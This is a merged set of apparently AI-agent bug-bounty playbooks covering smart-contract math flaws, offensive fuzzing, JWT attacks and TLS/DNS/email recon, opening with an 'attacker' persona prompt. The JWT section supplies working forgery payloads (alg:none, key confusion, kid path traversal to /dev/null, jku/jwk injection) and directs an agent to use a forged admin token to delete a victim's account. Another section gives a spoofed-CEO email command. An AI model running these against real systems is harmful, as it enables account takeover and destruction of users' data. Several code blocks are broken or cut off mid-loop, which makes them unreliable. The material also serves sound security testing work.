# MERGED SOURCE KNOWLEDGE: crypto

133 unique sections from 6 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/crypto-math-agent.md

# Crypto / Math & Precision Agent

You are not a reviewer. You are an attacker. Your domain is every place a protocol trusts math to be correct — and gets it wrong. Overflow wraps. Precision evaporates. Signatures lie. Nonces replay. You find the exact input that breaks the invariant and prove it with numbers.

### Integer Arithmetic

- **Overflow/Underflow (pre-0.8 or `unchecked` blocks):** Find every `uint` subtraction and multiplication. Can the result wrap? What's the downstream effect?
- **Truncation:** `uint256 → uint128 → uint64` downcasts. Is the value checked before cast? Truncation in `uint32(block.timestamp)` causes year-2038 class issues.
- **Multiplication before division:** `(a / b) * c` loses precision vs `(a * c) / b`. Find all fee, percentage, and exchange rate calculations.
- **Division by zero:** Any `denominator` variable that could be zero — is it checked?
- **`mulDiv` with rounding direction:** Protocol-favoring rounding (round down for user-receivable, round up for protocol-receivable). Find cases where direction is wrong, especially when compounding.

### Precision Loss & Rounding

- **Dust accumulation:** Small amounts rounded to zero repeatedly. Attacker makes many small operations to drain via accumulated rounding errors.
- **Exchange rate manipulation:** `price = totalAssets / totalShares` — when `totalShares → 0` or `totalAssets → 0`, precision collapses. First depositor / inflation attack vector.
- **Fixed-point arithmetic:** Decimals mismatch between tokens (6 vs 18). Computation done in 6-decimal space then scaled — is the scale applied correctly?
- **Nonce precision loss:** Large nonce values cast to smaller types (e.g., `uint32`) that overflow. Nonce wraps → replay window opens.

### Cryptographic Primitives

- **`ecrecover` zero address:** If signature is invalid, `ecrecover` returns `address(0)`. Is the return value checked `!= address(0)`?
- **Signature malleability:** `s` value in the upper half of the curve range. EIP-2 compliance check.
- **Replay attacks:** Missing `chainId`, `nonce`, `deadline`, or `contractAddress` in the signed message hash.
- **Weak randomness:** `keccak256(block.timestamp, block.prevrandao, msg.sender)` — miner/validator manipulable. Any RNG that an on-chain actor can influence.
- **Hash length extension:** SHA-2 constructions used without HMAC — attacker can extend the message.
- **Merkle proof:** Missing leaf preimage validation (hash the leaf before checking, not the raw value). Missing check that the proof length is bounded.

### EIP-712 & Structured Hashing

- `DOMAIN_SEPARATOR` not including `chainId` → cross-chain replay.
- `DOMAIN_SEPARATOR` not including `verifyingContract` → cross-contract replay.
- `DOMAIN_SEPARATOR` cached at deploy time but contract is deployed behind a proxy that moves chains — stale separator.
- Type hash not matching the actual struct fields — attacker crafts a different struct that hashes to the same typehash.
- `encodeData` for arrays/structs: elements not individually hashed before inclusion → collision.

### Key Management & Threshold Schemes

- Single point of failure: `numRequiredAttestations == 1` or `threshold == 1` in multisig-like systems.
- Key rotation gap: old key still valid during rotation window.
- HSM/TEE assumption: contract assumes key is in hardware but doesn't enforce it on-chain.
- Attester set not bounded: unlimited attesters can be added, potential denial-of-service via set size.

### Solana / Anchor Specific

- `u64` arithmetic without `checked_add`/`checked_mul` in non-0.8 equivalent contexts.
- `Clock::get()?.unix_timestamp` as `i64` — potential sign issues when used in `u64` context.
- `Pubkey::find_program_address` bump seed not validated — attacker uses a non-canonical bump.

### DEFLATE / Compression (SDK-level)

- Buffer truncation: decompression output buffer not sized for worst-case expansion (32KB input → 1MB output).
- Zip bomb: crafted input that expands to memory exhaustion.
- Partial decompression: function returns partial output without error on truncated input — downstream consumer treats partial data as complete.

## Output Fields

Add to FINDINGs:

```
operation: <the arithmetic/crypto operation that's flawed>
numeric_proof: <concrete values showing the overflow/precision loss>
  e.g., amount=2^128, shares=1 → price=0 due to truncation
affected_invariant: <what mathematical property is violated>
```

## Rules
- No vague findings — prove it with numbers
- Assume hostile input at every call site
- Every `unchecked` block is a suspect until cleared
- Every downcast is a footgun until range-checked
- No `chainId` in a signed hash = replay vector
- `ecrecover` returning `address(0)` = open door


## SOURCE: hunt-skills/fuzzing/offensive-fuzzing/SKILL.md

## Fuzzer Types

| Type | Coverage | Speed | Tools |
|------|----------|-------|-------|
| BlackBox | Poor | Fast | Peach, Boofuzz |
| GreyBox | Good | Fast | AFL++, Honggfuzz, libFuzzer, WinAFL |
| Snapshot | Good | Fastest | Nyx, wtf, Snapchange |
| WhiteBox | Best | Slow | KLEE, QSYM, SymSan |
| Ensemble | Best | Fast | AFL++ + Honggfuzz + libFuzzer |

**GreyBox sub-variants:** Directed (AFLGo, UAFuzz), Grammar (AFLSmart, Tlspuffin), Concolic (QSYM, Driller), Kernel (syzkaller, kAFL, wtf).

## Core Workflow

```
Research target → Choose analyses → Build harness → Seed corpus → Instrument → Fuzz → Triage crashes → Report
```

### 1. Research Target

- Map all input surfaces (files, network, IPC, syscalls, IOCTL)
- Identify high-value areas: previously patched code, complex parsers, newly added code, input ingestion points
- For kernel modules: look beyond `copy_from_user` — DMA-BUF ops, page fault handlers, VM operation structs, allocation callbacks

# AFL++ (preferred for GreyBox)
CC=afl-clang-fast CXX=afl-clang-fast++ cmake -DCMAKE_BUILD_TYPE=Release .. && make -j

# libFuzzer + ASan/UBSan (C/C++)
cmake -DCMAKE_CXX_FLAGS="-fsanitize=fuzzer,address,undefined -O1 -g" ..

# CmpLog build for hard compares
AFL_LLVM_CMPLOG=1 CC=afl-clang-fast CXX=afl-clang-fast++ make clean all
```

**Windows (MSVC):** `Project Properties → C/C++ → Address Sanitizer: Yes (/fsanitize=address)`

### 3. Write Harness

**libFuzzer (C++):**
```cpp
#include <cstdint>
#include <cstddef>
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
    parse_or_process(data, size);
    return 0;
}
```

**Honggfuzz HF_ITER (persistent mode — preferred for large targets):**
```cpp
#include "honggfuzz.h"
int main(int argc, char** argv) {
    initialize_target(); // runs once
    for (;;) {
        size_t len; uint8_t *buf;
        HF_ITER(&buf, &len);
        FILE* s = fmemopen(buf, len, "r");
        target_function(s);
        fclose(s);
        reset_target_state();
    }
}
```

**AFL++ persistent mode (`__AFL_LOOP`):**
```cpp
while (__AFL_LOOP(10000)) {
    // re-read input and process
}
```

**macOS IPC (Mach message fuzzing):**
```c
void *lib_handle = dlopen("libexample.dylib", RTLD_LAZY);
pFunction = dlsym(lib_handle, "DesiredFunction");
```

### 4. Build Seed Corpus

- Pull from target's test suite, bug reports, and real-world samples
- Web-crawl (Common Crawl) for file formats; filter by MIME type
- Minimize: `afl-cmin -i raw_corpus -o seeds -- ./target @@`
- Trim inputs: `afl-tmin -i crash -o crash.min -- ./target @@`

### 5. Launch Fuzzing

**AFL++ parallel (primary + secondary with cmplog):**
```bash
afl-fuzz -M f1 -i seeds -o findings -x dict.txt -- ./target @@
afl-fuzz -S s1 -i seeds -o findings -c 0 -- ./target @@
```

**libFuzzer:**
```bash
./target_libfuzzer corpus/ -max_total_time=3600 -workers=4
```

**Binary-only (QEMU):**
```bash
afl-fuzz -Q -i seeds -o findings -- target.exe @@
```

**Snapshot (AFL++ Nyx):**
```bash
NYX_MODE=1 AFL_MAP_SIZE=1048576 afl-fuzz -i seeds -o findings -- ./target_nyx @@
```

**Ensemble (AFL++ + Honggfuzz sharing corpus):**
```bash

# Terminal 2
../honggfuzz/honggfuzz -i sync_dir/fuzzer1/queue -W sync_dir/hfuzz \
  --linux_perf_ipt_block -t 10 -- ./target ___FILE___
```

### 6. Monitor and Unstick

If progress stalls:
- Enable CmpLog: `-c 0` on AFL++ secondaries
- Add dictionary: `-x dict.txt` or `AFL_TOKEN_FILE`
- Switch to directed fuzzing (AFLGo) targeting specific BBs/functions
- Use concolic assistance (QSYM, Driller) on hard branches
- Snapshot the target to increase exec/s
- `AFL_MAP_SIZE=1048576`, `-L 0` for MOpt scheduler

# 2. Symbolize
ASAN_OPTIONS=abort_on_error=1:symbolize=1 ./target crash.min 2>asan.log

# 3. Hash + bucket
./cov-tool --bbids ./target crash.min > cov.hash
./bucket.py --key "$(cat cov.hash)" --log asan.log --out triage/
```

**Sanitizer env quick reference:**
```
ASAN_OPTIONS=abort_on_error=1:symbolize=1:detect_stack_use_after_return=1
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
TSAN_OPTIONS=halt_on_error=1:history_size=7
MSAN_OPTIONS=poison_in_dtor=1:track_origins=2
```

## Oracle Selection

| Bug Class | Oracle |
|-----------|--------|
| Memory safety | ASan, HWASan (AArch64, lower overhead) |
| Uninitialized reads | MSan |
| Concurrency | TSan |
| Undefined behavior | UBSan |
| Type safety | TypeSan |
| Heap hardening | Scudo Hardened Allocator |
| Logic bugs | Differential / idempotency oracles |
| Kernel memory | KASAN, KMSAN, KCSAN |
| Kernel UB | KUBSan (`CONFIG_UBSAN_TRAP=y`) |
| CFI | KCFI (`-fsanitize=kcfi`, Clang 18) |
| Binary-only | QASAN (QEMU+ASan), DynamoRIO |

**Property oracle patterns:**
- Idempotency: `f(x) == f(f(x))`
- Differential: compare two impls, bucket on output mismatch
- Invariants: monotonic lengths, checksum equality, schema validation post-parse

### Kernel (Linux) — syzkaller

```json
{
  "target": "linux/arm64",
  "http": ":56700",
  "workdir": "/path/to/workdir",
  "kernel_obj": "/path/to/kernel",
  "image": "/path/to/rootfs.ext3",
  "sshkey": "/path/to/id_rsa",
  "procs": 8,
  "enable_syscalls": ["openat$module_name", "ioctl$IOCTL_CMD", "mmap"],
  "type": "qemu",
  "vm": { "count": 4, "cpu": 2, "mem": 2048 }
}
```

- Limit `enable_syscalls` to deepen coverage on specific subsystems
- Use `syz-extract` to pull constants for custom modules
- Enable `CONFIG_KASAN=y`, `CONFIG_KCFI=y`, `CONFIG_DEBUG_INFO_BTF=y`
- Use `kcov` filters and `syz_cover_filter` to direct coverage
- Network fuzzing: inject via `TUN/TAP` + pseudo-syscalls (`syz_emit_ethernet`)
- Crash decode: `./scripts/decode_stacktrace.sh vmlinux ... < dmesg.log`

**syzkaller repro:**
```bash
syz-execprog -repeat=0 -procs=1 -cover=0 -debug target.repro
```

### EDR / Windows Scanning Engines

**WTF snapshot harness skeleton (mpengine.dll / mini-filter):**
```cpp
g_Backend->SetBreakpoint("nt!KeBugCheck2", [](Backend_t *Backend) {
    const uint64_t BCode = Backend->GetArg(0);
    Backend->Stop(Crash_t(fmt::format("crash-{:#x}", BCode)));
});
```

**FilterConnectionPort fuzzing:**
```cpp
HANDLE hPort;
FilterConnectCommunicationPort(L"\\PortName", 0, NULL, 0, NULL, &hPort);
FilterSendMessage(hPort, fuzzData, sizeof(fuzzData), NULL, 0, &bytesReturned);
```

**IOCTL fuzzing pattern:**
```cpp
HANDLE hDev = CreateFile(L"\\\\.\\DeviceName", GENERIC_READ|GENERIC_WRITE, ...);
DeviceIoControl(hDev, ioctlCode, inputBuf, inputLen, outBuf, outLen, &ret, NULL);
```

- Take snapshots after initialization, right before parse/dispatch loop
- Use IDA Lighthouse for coverage visualization
- Monitor: `DRIVER_VERIFIER_DETECTED_VIOLATION (0xc4)`, `IRQL_NOT_LESS_OR_EQUAL (0xa)`
- WinDbg: `.symfix; !analyze -v; k; !heap -p -a @rax`

**Cross-platform mpengine.dll on Linux (loadlibrary + HF_ITER + Intel PT):**
```cpp
// Bypass Lua VM to avoid stability issues
insert_function_redirect((void*)luaV_execute_address, my_lua_exec, HOOK_REPLACE_FUNCTION);
for (;;) {
    HF_ITER(&buf, &len);
    ScanDescriptor.UserPtr = fmemopen(buf, len, "r");
    __rsignal(&KernelHandle, RSIG_SCAN_STREAMBUFFER, &ScanParams, sizeof ScanParams);
}
```

# Full Rust fuzzing pipeline
cargo test                                         # 1. property tests
cargo +nightly miri test                           # 2. UB via interpreter
cargo +nightly careful test                        # 3. runtime bounds checks
cargo fuzz run fuzz_target_1 -- -max_total_time=3600  # 4. libFuzzer crashes
RUSTFLAGS="--cfg loom" cargo test --release        # 5. concurrency (if needed)
cargo fuzz coverage fuzz_target_1                  # 6. coverage report
```

Focus unsafe blocks on: `Vec::from_raw_parts`, unchecked indexing, `transmute` size mismatches, pointer arithmetic, FFI integer truncation.

### Embedded / Binary-Only

- **LibAFL**: Modular Rust framework; Unicorn engine, snapshot module, LBRFeedback (zero-instrumentation on Intel), SAND decoupled sanitization
- **Retrowrite / QASAN**: Binary rewriting for coverage + ASan without source
- **Nautilus**: Grammar-based fuzzing for structured formats

### Language Ecosystems

- **Go 1.18+**: `go test -fuzz=Fuzz -run=^$ ./...`
- **Python**: [Atheris](https://github.com/google/atheris) (CPython native extension fuzzing)
- **Rust**: `cargo-fuzz` or `honggfuzz-rs`
- **JS engines**: Fuzzilli with extended instrumentation (`__builtin_return_address(0)` for PC tracking)
- **Wasm runtimes**: `wasmtime-fuzz`, `wafl` for differential fuzzing across V8/Wasmer/Wasmtime
- **Smart contracts**: Echidna, Foundry-fuzz (Solidity); Move-Fuzz (Aptos/Sui)

## CI/CD Integration

```yaml
- name: Build with afl-clang-fast
  run: CC=afl-clang-fast make -j
- name: Fuzz (smoke, 15 min)
  run: timeout 15m afl-fuzz -i seeds -o findings -- ./target @@ || true
- name: Upload crashes
  if: always()
  uses: actions/upload-artifact@v4
  with:
    path: findings/**/crashes/*
```

Use **ClusterFuzzLite** for persistent continuous fuzzing; cache corpora between runs.

## Crash Analysis Quick Reference

**Linux:**
```bash
ulimit -c unlimited && sysctl -w kernel.core_pattern=core.%e.%p
gdb -q ./target core.* -ex 'bt' -ex 'info reg' -ex q
addr2line -e ./target 0xDEADBEEF
```

**Windows:**
```powershell

# Enable local dumps
New-Item 'HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps' -Force

# PageHeap
gflags /p /enable target.exe /full
```

**Kernel KASAN/KMSAN:**
```bash
dmesg -T | egrep -i 'kasan|kmsan' -A 60
./scripts/decode_stacktrace.sh vmlinux /lib/modules/$(uname -r)/build < dmesg.log
```

**Reproducibility:** pin CPU governor, disable ASLR only where safe, fix RNG seeds, save input sequences in persistent mode, record binary hashes and sanitizer options with every crash.

## Tool Index

| Tool | Use Case |
|------|----------|
| [AFL++](https://github.com/AFLplusplus/AFLplusplus) | General GreyBox, CmpLog, MOpt, Nyx |
| [Honggfuzz](https://github.com/google/honggfuzz) | Intel PT, crash detection, HF_ITER |
| [libFuzzer](https://llvm.org/docs/LibFuzzer.html) | In-process, source available |
| [syzkaller](https://github.com/google/syzkaller) | Linux/Windows kernel syscall fuzzing |
| [wtf](https://github.com/0vercl0k/wtf) | Snapshot fuzzing, Windows targets |
| [Nyx](https://github.com/nyx-fuzz/Nyx) | AFL++ snapshot mode (Intel PT) |
| [Snapchange](https://github.com/awslabs/snapchange) | AWS snapshot fuzzing |
| [LibAFL](https://github.com/AFLplusplus/LibAFL) | Custom Rust fuzzing framework |
| [AFLGo](https://github.com/aflgo/aflgo) | Directed fuzzing to target BB/function |
| [kAFL](https://github.com/IntelLabs/kAFL) | Kernel + OS fuzzing |
| [Jackalope](https://github.com/googleprojectzero/Jackalope) | Binary coverage-guided (Windows/macOS) |
| [cargo-fuzz](https://github.com/rust-fuzz/cargo-fuzz) | Rust libFuzzer integration |
| [Atheris](https://github.com/google/atheris) | Python fuzzing |
| [Nautilus](https://github.com/nautilus-fuzz/nautilus) | Grammar-based fuzzing |
| [AFLTriage](https://github.com/quic/AFLTriage) | Automated crash triage |
| [afl-cov](https://github.com/mrash/afl-cov) | Coverage analysis for AFL++ |
| [ClusterFuzz](https://github.com/google/clusterfuzz) | Distributed fuzzing infrastructure |


## SOURCE: hunt-skills/hunt-jwt-crypto/SKILL.md

## What actually pays

A JWT is `header.payload.signature`, each base64url. The signature is the only
thing stopping you from editing the payload (your identity/role) and replaying
it. It pays **High/Critical** when the verifier can be tricked into accepting a
token you forged — so you become another user or an admin without their secret.

Two classic, generic verifier flaws:

- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
  `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
  another user's `id`/`email`). A broken verifier skips signature checking.
- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
  RSA **public** key is, by definition, public. If the verifier lets you choose
  HS256, it will use that public key as the HMAC *secret* — which you also know.
  Sign an edited payload with HS256 using the public key and it validates.

## Recon — is this app JWT-based?

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

Decode the header (base64url the first segment). `"alg":"RS256"` → try key
confusion. Any alg → always try `alg:none` first; it's free.

## Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
attacker-controlled and reaches a dangerous sink.

**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.

**Expiry / time-based claim manipulation**
```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```
Combined with any forging technique above (alg:none, key confusion, jwk injection), this
bypasses time-based validation when the verifier does not enforce strict expiry rules.

**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```
This is systematic IDOR via claims — if authorization logic trusts the token claims
without checking ownership server-side, you cross into another tenant's resources.
Works especially well combined with alg:none or weak-secret attacks.

Match the `payload` shape to a REAL token from the app (decode one first) — keep
its claim names, only change identity/role. A payload the app can't parse fails
for the wrong reason and wastes the attempt.

## Offline attacks — weak HMAC secret cracking

If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
password list:
```bash

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```
Once the secret is cracked, forge any token using HS256 with that secret (via
jwt_tool or PyJWT).

## Automated attack automation

Use purpose-built JWT attack suites to run all known forgery modes in parallel:
```bash

# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```
Run these early in JWT recon; they often find the vulnerability faster than
manual chaining of individual techniques.

## Drive to the ADMIN objective — do not stop at a working forge

A forge that loads YOUR own `/my-account` is NOT the goal — it just proves the
forge mechanism works. The objective is almost always **admin** (reach an
admin-only page and perform an admin action, e.g. delete a user). Once any forge
is accepted, IMMEDIATELY escalate — change identity to admin AND aim at the admin
endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.

Fixed escalation sequence (run it in order, do not loop on earlier steps):

1. Forge admin identity and hit the admin page (try these claim names — match a
   decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token
   with `kid` pointed at `/dev/null` and an empty secret, payload `{"sub":"administrator"}`,
   sent to `GET /admin`.
2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform
   the admin action with the SAME forged token — a typical one is deleting a
   target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps
   use `POST /admin/delete` — read the admin page for the exact form/verb).

A 401 on `/admin` means the forge/claim is wrong — change ONE thing (the kid
depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare
unauthenticated `GET /admin` (no token) — that always 401s and wastes effort.

## Proof of impact

Point the forged token at a protected/admin endpoint and prove you read data you
should not: an account/user listing (multiple users' emails), another user's
object, or a completed admin action (the deleted-user confirmation). Reading the
admin user list or performing the admin action with a forged token IS the exploit.
A 200 that returns only your own data, or a 401, is not proof.

## Validation discipline

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.


## SOURCE: hunt-skills/hunt-tls-network/SKILL.md

## Reality Check (Read First)

Most findings in this class are **Info/Low and routinely rejected** as "best-practice" / "missing-hardening" by triage. This skill exists to stop you wasting a submission. Two questions before you report anything here:

1. **Is there a real victim and a real action?** "Missing HSTS" is not a vulnerability — *demonstrated session-cookie capture from a victim you MitM'd* is. "Missing CAA" is never a vulnerability you can demonstrate.
2. **Does the program accept it?** Many programs explicitly list missing SPF/DMARC, missing security headers, weak ciphers without exploit, and CAA as **out of scope**. Read scope first; quote the in-scope line in your report.

**What actually pays in this class (in order):**
- **Dangling-CNAME / dangling-A subdomain takeover** — you control content on `target.com` subdomain. Real impact, real bounty. (Owned in depth by `hunt-subdomain`; covered here for the TLS/DNS recon angle.)
- **Spoofable DMARC, proven by delivered-to-inbox email** — not "p=none exists" but an actual mail from `ceo@target.com` landing in a real inbox with a passing/none DMARC verdict in the headers.
- **DNS AXFR returning internal hosts** — full internal hostname/IP map. Concrete recon value, often Medium.
- **mTLS / client-cert bypass on an internal service** — reaching authenticated-only functionality without the cert. Real auth bypass = High.
- **Exploited TLS weakness with a working decrypt/MitM PoC** — almost never achievable remotely in 2024-2026 against a patched stack; see Phase 1 caveats.

**What does NOT pay (do not report standalone):** missing CAA, missing HSTS with no MitM PoC, missing security headers alone, weak-cipher *support* without an exploit, self-signed cert on a non-prod host, TLS 1.0/1.1 *enabled* without a downgrade victim.

---

# Quick TLS test with testssl.sh
brew install testssl
testssl.sh --fast $TARGET 2>/dev/null | grep -E "CRITICAL|HIGH|MEDIUM|OK|NOT" | head -30

# Or use sslyze (Python)
pip3 install sslyze
python3 -m sslyze $TARGET --json_out /tmp/sslyze_$TARGET.json 2>/dev/null
cat /tmp/sslyze_$TARGET.json | python3 -m json.tool | grep -i "vulnerability\|insecure\|error" | head -20

# Check certificate expiry and chain
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer 2>/dev/null

# Check for weak ciphers manually (a successful handshake = the cipher is OFFERED, not exploitable)
openssl s_client -connect $TARGET:443 -cipher RC4-SHA 2>/dev/null | grep -i "cipher\|handshake"
openssl s_client -connect $TARGET:443 -cipher DES-CBC3-SHA 2>/dev/null | grep -i "cipher\|handshake"

# Protocol downgrade surface — TLS 1.0/1.1 still negotiable?
openssl s_client -connect $TARGET:443 -tls1   2>/dev/null | grep -E "Protocol|Cipher"
openssl s_client -connect $TARGET:443 -tls1_1 2>/dev/null | grep -E "Protocol|Cipher"
```

**Accuracy / triage notes — do not over-claim TLS bugs:**

- **Offered ≠ exploitable.** testssl/sslyze flagging RC4, 3DES, or TLS 1.0 means the server *negotiates* it. That is a hardening finding, **not** a demonstrated decrypt. Without a PoC it is Info/Low and frequently OOS.
- **SWEET32 (CVE-2016-2183)** — 3DES birthday attack. Requires a long-lived TLS session, an on-path attacker, and ~hundreds of GB / hours of same-key traffic. Realistically un-demonstrable in a bug bounty; report only the *support* of 3DES, expect Low/Info.
- **POODLE (CVE-2014-3566)** — SSLv3 CBC padding oracle. Needs **SSLv3 actually enabled**; almost no modern stack offers it. Confirm with `testssl.sh --poodle` (or `nmap --script ssl-poodle`) — modern OpenSSL 3.x dropped the `-ssl3` flag. If SSLv3 won't negotiate, there is no POODLE.
- **FREAK (CVE-2015-0204)** and **DROWN (CVE-2016-0800)** — require export-grade RSA / a shared SSLv2 endpoint respectively. Both are pre-conditions you must *prove present*, not assume. DROWN needs SSLv2 reachable on *some* host sharing the cert/key — scan for SSLv2 with `testssl.sh --drown` (or `nmap --script sslv2-drown`) across the cert's SAN list before claiming it; modern OpenSSL has no `-ssl2` flag.
- **Heartbleed (CVE-2014-0160)** — if you genuinely find an unpatched OpenSSL 1.0.1 leaking memory, that *is* High/Critical with a real PoC (dump containing keys/cookies). Verify with `testssl.sh --heartbleed` and capture leaked bytes; this is the rare TLS bug worth a full report.

---

# Check HSTS header on main domain and all subdomains
curl -sI "https://$TARGET/" | grep -i "strict-transport-security"

# Expected: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Check critical subdomains (login, api, auth)
for sub in login auth api account pay www; do
  HSTS=$(curl -sI "https://$sub.$TARGET/" 2>/dev/null | grep -i "strict-transport-security")
  if [ -z "$HSTS" ]; then
    echo "[!] MISSING HSTS: https://$sub.$TARGET/"
  else
    echo "[OK] $sub.$TARGET: $HSTS"
  fi
done

# Check HTTP (non-HTTPS) redirect
curl -sI "http://$TARGET/" | grep -i "location"

# HSTS preload check
curl -s "https://hstspreload.org/api/v2/status?domain=$TARGET" | python3 -m json.tool 2>/dev/null
```

---

# Attempt zone transfer on each nameserver
for NS in $(dig NS $TARGET +short); do
  echo "=== Trying AXFR from $NS ==="
  dig AXFR $TARGET @$NS 2>/dev/null | grep -v "^;" | head -30
done

# Zone transfer via alternative tools
host -t AXFR $TARGET $(dig NS $TARGET +short | head -1) 2>/dev/null | head -30
nmap -sn --script dns-zone-transfer $TARGET 2>/dev/null | head -30

# Look for: internal IPs, staging servers, admin hostnames, CI/CD servers
```

---

# Check DKIM selectors (common: default, google, mail, k1)
for selector in default google mail k1 selector1 selector2 s1 s2 dkim; do
  RESULT=$(dig TXT $selector._domainkey.$TARGET +short 2>/dev/null)
  [ -n "$RESULT" ] && echo "DKIM selector found: $selector → $RESULT"
done

# --- Spoofability evaluation (heuristic only; PROOF is the swaks test below) ---
SPF=$(dig +short TXT $TARGET | tr -d '"' | grep -i "v=spf1")
DMARC=$(dig +short TXT _dmarc.$TARGET | tr -d '"' | grep -i "v=DMARC1")

# SPF "+all" / "all" with no qualifier = pass-everything = spoofable from any IP
echo "$SPF" | grep -Eq '[+ ]all($|[^-~?])' && echo "[CRITICAL] SPF passes all senders (+all)"
echo "$SPF" | grep -q "~all" && echo "[INFO] SPF softfail (~all) — may still deliver to inbox"
[ -z "$SPF" ] && echo "[INFO] No SPF record"

# Correct DMARC-absence check: test the variable for emptiness, do NOT pipe dig|wc -c
if [ -z "$DMARC" ]; then
  echo "[INFO] No DMARC record (no published policy)"
else
  POLICY=$(echo "$DMARC" | grep -oiE 'p=[a-z]+' | head -1)
  echo "[INFO] DMARC present: $POLICY"
  echo "$POLICY" | grep -qi "p=none" && echo "  -> p=none: monitors only, does NOT block spoofed mail"
  echo "$POLICY" | grep -qiE "p=(quarantine|reject)" && echo "  -> enforcing policy: spoofing likely blocked at receiver"
fi
```

**Why the original `dig ... | wc -c | grep '^1$'` check was broken:** empty `dig +short` output is a zero-length string; piped through `wc -c` it usually yields `0`, and the surrounding newline handling is shell-dependent, so the `^1$` match misfires both ways. Always capture into a variable and test `[ -z "$VAR" ]`.

### Spoofability is a RECEIVER decision, not a record-reading exercise

Do not report "missing DMARC = email spoofing" from `dig` output alone. DMARC `p=none` (or absent) means the **sending domain published no enforcement** — but the **receiving** mail provider (Gmail, M365, the program's own MX) may still junk or reject your spoof based on SPF, its own heuristics, or ARC. The only proof that survives triage is a **message you delivered to a real inbox**.

```bash

# PROOF: send a spoofed mail and confirm INBOX delivery (use a tester account you own)

# Use an account on the receiver the program actually uses (check their MX: dig MX $TARGET)
swaks --to your-tester@gmail.com \
      --from "CEO <ceo@$TARGET>" \
      --header "Subject: [TEST] DMARC spoof PoC for $TARGET" \
      --body "Authorized bug-bounty test. Spoofed from-domain: $TARGET" \
      --server <an-smtp-relay-you-control-or-localhost>
```

**Confirmation gate — a spoof PoC is only valid if you can show:**
1. The message landed in **Inbox** (not Spam/Junk), screenshot the folder.
2. The raw headers: `Authentication-Results:` showing `dmarc=none|fail` AND the mail was still **delivered** (not bounced). A bounce or a Spam-folder landing is NOT a finding — note it and move on.
3. The visible `From:` shows `@$TARGET` to the recipient (header-from spoof, the one that matters for phishing), not just an `envelope-from` trick.

Severity is **Medium at best**, and only if delivered-to-inbox. Many programs mark email-auth findings OOS outright — check scope first.

---

# Check each critical header
for HEADER in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" \
              "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy"; do
  RESULT=$(echo "$HEADERS" | grep -i "$HEADER")
